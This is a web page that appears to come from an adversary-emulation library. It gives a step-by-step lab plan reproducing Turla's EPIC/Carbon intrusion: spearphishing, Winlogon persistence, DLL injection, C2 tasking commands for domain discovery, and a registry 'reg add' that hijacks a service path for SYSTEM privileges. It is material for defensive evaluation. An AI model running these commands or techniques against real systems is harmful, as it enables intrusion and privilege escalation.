<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.772030412050">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.5.0">

    <!-- Primary Meta Tags -->
    <title>Scenario Overview</title>
    <meta name="title" content="Scenario Overview">
    <meta name="description" content="Legend of symbols:">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/enterprise/turla/emulation_plan/carbon_scenario/carbon_detections_scenario/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/enterprise/turla/emulation_plan/carbon_scenario/carbon_detections_scenario/">
    <meta property="og:title" content="Scenario Overview">
    <meta property="og:description" content="Legend of symbols:">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/enterprise/turla/emulation_plan/carbon_scenario/carbon_detections_scenario/">
    <meta property="twitter:title" content="Scenario Overview">
    <meta property="twitter:description" content="Legend of symbols:">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../../resources/css/retype.css?v=3.5.0.772030412050" rel="stylesheet">

    <script data-cfasync="false" src="../../../../../resources/js/config.js?v=3.5.0.772030412050" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../../resources/js/lunr.js?v=3.5.0.772030412050" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../../resources/js/prism.js?v=3.5.0.772030412050" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../../" class="pr-4">
                                                ATT&​CK Evaluations Library Overview
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Enterprise
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../../enterprise/turla/" class="pr-4">
                                                Turla
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../../enterprise/turla/emulation_plan/" class="pr-4">
                                                Turla Emulation Plans
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../../enterprise/turla/emulation_plan/carbon_scenario/" class="pr-4">
                                                Carbon Scenario
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../../enterprise/turla/emulation_plan/carbon_scenario/carbon_detections_scenario/" class="pr-4">
                                                Scenario Overview
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="scenario-overview" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#scenario-overview">#</doc-anchor-trigger>
        <span>Scenario Overview</span>
    </h1>
</doc-anchor-target>
<p>Legend of symbols:</p>
<ul>
<li><span class="docs-emoji">&#x1F4A1;</span> - callout notes</li>
<li><span class="docs-emoji">&#x2757;</span> - extremely important note</li>
<li><span class="docs-emoji">&#x27A1;&#xFE0F;</span> - Switching to another session</li>
<li><span class="docs-emoji">&#x2B55;</span> - Sign out of something</li>
</ul>
<hr>
<doc-anchor-target id="setup">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#setup">#</doc-anchor-trigger>
        <span>Setup</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP, do not SSH, to the Kali attacker machine <code v-pre>(176.59.15.33)</code>.</p>
<ul>
<li>Open a new terminal window, cd to the cloned repo control server, clear previous server logs, and start the control server:</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /opt/day1/turla/Resources/control_server
rm logs.txt
sudo ./controlServer -c ./config/turla_day1.yml</code></pre>
</doc-codeblock></div>
<ul>
<li>Ensure that the Carbon and EPIC handlers started up.</li>
</ul>
<doc-anchor-target id="step-1---initial-compromise">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-1---initial-compromise">#</doc-anchor-trigger>
        <span>Step 1 - Initial Compromise</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 1 emulates Turla gaining initial access via a spearphishing link sent in
an email to the user <code v-pre>Gunter</code>.</p>
<p>The link initiates the download of a fake software update executable named
NTFVersion.exe. This executable contains another malicious executable, the
injector for the EPIC implant.</p>
<p>When the fake updater is run by the user:</p>
<ol>
<li>The updater writes the embedded injector to the user&#x27;s path indicated by the
<code v-pre>%TEMP%</code> environment variable as <code v-pre>mxs_installer.exe</code>.</li>
<li>The updater adds a <code v-pre>Shell</code> key value to the current user&#x27;s <code v-pre>Winlogon</code>
registry key (<code v-pre>HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code>),
where, upon Windows authentication, the injector will be executed in addition
to explorer.exe.</li>
</ol>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP to <code v-pre>hobgoblin (10.20.20.102)</code> as <code v-pre>Gunter</code>:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\Gunter</td>
<td style="text-align: center;">Password1!</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>Open Microsoft Edge, declining all first-run options, and browse to <code v-pre>https://brieftragerin.skt.local/owa</code>. Login:</li>
</ul>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\Gunter</td>
<td style="text-align: center;">Password1!</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>Open the email from
<code v-pre>noreply@sktlocal.it</code> and click the link in the email to initiate the download of
<code v-pre>NTFVersion.exe</code>.</p>
</li>
<li><p>Once the download has been completed, click the downloaded binary to execute it.</p>
</li>
</ul>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../resources/epic/simpledropper">EPIC Dropper</a>
<ul>
<li><a href="../../../resources/epic/simpledropper/simpledropper/source.cpp#L34-L50">File write of EPIC injector as mxs_installer.exe</a></li>
<li><a href="../../../resources/epic/simpledropper/simpledropper/source.cpp#L95-L143">Registry modification</a></li>
</ul>
</li>
<li><a href="../../../resources/epic/defense-evasion/reflective_injector/reflective_injector/">EPIC Injector</a></li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://securelist.com/the-epic-turla-operation/65545/">https://securelist.com/the-epic-turla-operation/65545/</a></li>
<li><a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments">https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39&amp;CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&amp;tab=librarydocuments</a></li>
<li><a href="https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf">https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf</a></li>
</ul>
<br>
<doc-anchor-target id="step-2---establish-initial-access">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-2---establish-initial-access">#</doc-anchor-trigger>
        <span>Step 2 - Establish Initial Access</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 2 emulates Turla establishing initial access and performing initial
discovery on the first host.</p>
<p>Eventually, Gunter logs off for the day and logs back in the next day,
executing the persistence mechanism for the EPIC implant.</p>
<p>When executed, the <code v-pre>mxs_installer.exe</code> will inject EPIC&#x27;s guard DLL into
<code v-pre>explorer.exe</code>. After EPIC&#x27;s guard DLL has been established, it will search for
processes that are typically internet enabled (e.g. <code v-pre>iexplore.exe</code>,
<code v-pre>msedge.exe</code>, or <code v-pre>firefox.exe</code>) and inject an embedded worker DLL. If the
process containing EPIC&#x27;s worker DLL is killed, EPIC&#x27;s guard DLL will
search for processes again and re-inject the worker DLL.</p>
<p>EPIC&#x27;s worker DLL will perform user enumeration and several host discovery
commands automatically after injection. The output is then written
to a log file at <code v-pre>%TEMP%\~D723574.tmp</code>. EPIC then bzip2 compresses and base64
encodes the data before sending the data in an HTTP request to the hardcoded
proxy server.</p>
<p>The C2 server responds with a UUID for EPIC to save for future communications.
This and all future communications between the C2 server and EPIC are bzip
compressed, AES encrypted, and base64 encoded. The AES session key is RSA
encrypted and packaged with the data in the HTTP request.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<p><span class="docs-emoji">&#x2B55;</span> Close out of all tabs and sign out of the RDP session to <code v-pre>hobgoblin (10.20.20.102)</code> as <code v-pre>Gunter</code>.</p>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Wait 2 minutes and then re-RDP to <code v-pre>hobgoblin (10.20.20.102)</code> as <code v-pre>Gunter</code>:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\Gunter</td>
<td style="text-align: center;">Password1!</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>Open Microsoft Edge and browse to <code v-pre>https://brieftragerin.skt.local/owa</code>.</li>
</ul>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> <strong>Set a timer for 2 minutes</strong> then switch to your Kali control server terminal and
confirm that a new implant has registered and the automated discovery output has been returned in
the server log.</p>
<p><strong>NOTE:</strong> The injector will wait <strong>2 minutes</strong>, before injecting EPIC&#x27;s Guard DLL into explorer.exe and,
subsequently, EPIC&#x27;s worker DLL into Microsoft Edge.</p>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/epic/defense-evasion/reflective_injector/reflective_injector/">EPIC Injector</a>
<ul>
<li>Extract EPIC Guard DLL from resources section <a href="../../../resources/epic/defense-evasion/reflective_injector/reflective_injector/source.cpp#L161-L193">FindResourceW</a></li>
<li>Targeting explorer.exe for <a href="../../../resources/epic/defense-evasion/reflective_injector/reflective_injector/source.cpp#L199-L233">DLL injection</a></li>
</ul>
</li>
<li><a href="../../../resources/epic/defense-evasion/reflective-guard/reflective-guard/">EPIC Guard</a>
<ul>
<li>Extract EPIC payload DLL from resources section <a href="../../../resources/epic/defense-evasion/reflective-guard/reflective-guard/dllmain.cpp#L161-L193">FindResourceW</a></li>
<li>Targeting browser processes for <a href="../../../resources/epic/defense-evasion/reflective-guard/reflective-guard/dllmain.cpp#L235-L283">DLL injection</a></li>
</ul>
</li>
<li><a href="../../../resources/epic/payload/">EPIC Payload</a>
<ul>
<li>Execute commands <a href="../../../resources/epic/payload/src/epic.cpp#L47-L71">ExecCmd</a></li>
<li>User discovery <a href="../../../resources/epic/payload/src/epic.cpp#L111-L182">GetAllUsers</a></li>
<li>Directory discovery <a href="../../../resources/epic/payload/src/epic.cpp#L257-L298">DirectoryDiscovery</a></li>
<li>Write results to log file <a href="../../../resources/epic/payload/src/epic.cpp#L311-L345">WriteResults</a></li>
<li>C2 communications are:
<ul>
<li><a href="../../../resources/epic/payload/src/comms.cpp#L462-L469">bzip2 compressed</a></li>
<li><a href="../../../resources/epic/payload/src/comms.cpp#L483-L484">AES encrypted</a></li>
<li><a href="../../../resources/epic/payload/src/comms.cpp#L487-L497">RSA encrypted AES key</a></li>
<li><a href="../../../resources/epic/payload/src/comms.cpp#L505">base64 encoded</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf">https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf</a></li>
<li><a href="https://securelist.com/analysis/publications/65545/the-epic-turla-operation/">https://securelist.com/analysis/publications/65545/the-epic-turla-operation/</a></li>
<li><a href="https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf">https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf</a></li>
<li><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf">https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf</a></li>
<li><a href="https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf">https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf</a></li>
</ul>
<br>
<doc-anchor-target id="step-3---discovery-and-privilege-escalation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-3---discovery-and-privilege-escalation">#</doc-anchor-trigger>
        <span>Step 3 - Discovery and Privilege Escalation</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 3 emulates Turla performing additional discovery using EPIC and privilege
escalation by abusing weak registry permissions.</p>
<p>Once C2 communications have been established between EPIC and the C2 via the
proxy server, initial network enumeration is performed on the first host
where information about the host device, local and domain groups, and network
configurations is collected.</p>
<p>At this point, the domain controller <code v-pre>bannik (10.20.10.9)</code> and several domain
administrator accounts, including <code v-pre>frieda</code>, are discovered. A custom service is
also discovered.</p>
<p>Next, additional enumeration of the registry is performed and a weak registry
permission for the service <code v-pre>ViperVPN</code> is discovered and the binary path is
modified to perform privilege escalation.</p>
<p>Eventually the service is restarted manually by a domain admin from the domain
controller to emulate the service being restarted via machine reboot. When the service restarts,
EPIC will be executed with SYSTEM level privileges.</p>
<p>Note that since this domain admin login is part of a whitecarded service restart,
we will not be using this logon session for subsequent activity.</p>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p>Within your Kali control server terminal window, right click and select &quot;Split Terminal Horizontally&quot;. Be careful not to terminate the control server.</p>
</li>
<li><p>In your lower terminal tab, copy and paste the first set of discovery commands:</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /opt/day1/turla/Resources/control_server
./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | net group &quot;Domain Admins&quot; /domain &amp;&amp; net group &quot;Domain Computers&quot; /domain &amp;&amp; net group &quot;Domain Controllers&quot; /domain &amp;&amp; tasklist /svc'</code></pre>
</doc-codeblock></div>
<ul>
<li><span class="docs-emoji">&#x2757;</span> Verify that the <code v-pre>ViperVPNSvc</code> service shows up in the tasklist output towards the end.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">grep 'ViperVPNSvc' logs.txt -i</code></pre>
</doc-codeblock></div>
<ul>
<li>This should return:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>
<blockquote>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">viperVpn.exe                  &lt;PID&gt; ViperVPNSvc</code></pre>
</doc-codeblock></div>
</blockquote>
</li>
<li><p>Wait 1 minute before tasking the next command to query the service and who can access it:</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg query HKLM\SYSTEM\CurrentControlSet\Services\ViperVPNSvc &amp;&amp; powershell &quot;$(Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ViperVPNSvc).Access&quot;'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task 218780a0-870e-480e-b2c5dc 'exe | reg add &quot;HKLM\system\currentcontrolset\services\ViperVPNSvc&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;cmd.exe /c %TEMP%\mxs_installer.exe&quot; /f'</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Wait 1 minute before switching to your RDP session to <code v-pre>hobgoblin (10.20.20.102)</code>. Minimize (do not close) the <code v-pre>hobgoblin (10.20.20.102)</code> RDP
window.</p>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> RDP into <code v-pre>bannik (10.20.10.9)</code>, as <code v-pre>Frieda</code>:</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\Frieda</td>
<td style="text-align: center;">Password3!</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>Close any spurious windows.</p>
</li>
